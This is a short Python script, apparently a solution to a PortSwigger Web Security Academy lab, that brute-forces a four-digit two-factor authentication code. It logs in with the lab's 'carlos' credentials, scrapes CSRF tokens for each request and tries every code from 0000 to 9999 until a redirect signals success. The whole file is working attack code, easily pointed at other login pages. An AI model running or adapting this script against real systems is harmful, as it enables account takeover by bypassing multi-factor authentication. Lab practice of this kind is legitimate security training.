#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup
from requests.models import Response
from requests.sessions import Session

# Get current CSRF token


def getCSRFToken(client: Session, URL, page) -> str:
    soup = BeautifulSoup(client.get(URL+page).content, features='html.parser')
    csrfToken = soup.find('input', dict(name='csrf'))['value']
    return csrfToken

# Login with given credentials


def postLogin(client: Session, URL, page, csrfToken, username, password):
    loginData = dict(csrf=csrfToken, username=username, password=password)
    client.post(URL+page, loginData)

# Send MFA Key


def postLogin2(client: Session, URL, page, csrfToken, mfaCode) -> Response:
    mfaData = {'csrf': csrfToken, 'mfa-code': mfaCode}
    return client.post(URL+page, mfaData)


def main():
    URL = 'https://ac3d1f1c1f89207b8092793c0061003d.web-security-academy.net'
    client = requests.session()

    # Bruteforce MFA Key
    for mfaCode in range(0, 10000):
        try:
            # Login to refresh session
            postLogin(
                client, URL,
                page='/login',
                csrfToken=getCSRFToken(client, URL, '/login'),
                username='carlos',
                password='montoya'
            )

            # Send MFA Key
            postPage = postLogin2(
                client, URL,
                page='/login2',
                csrfToken=getCSRFToken(client, URL, '/login2'),
                mfaCode=str(mfaCode).rjust(4, '0')
            )

            # Print out request info
            print(
                f'MFA: {str(mfaCode).rjust(4, "0")}  STATUS: {postPage.status_code}')
            if postPage.status_code == 302:
                print('######## FOUND ########')
                print(f'{postPage.url}\n')
        except:
            mfaCode -= 1
            continue


# Script
if __name__ == '__main__':
    main()
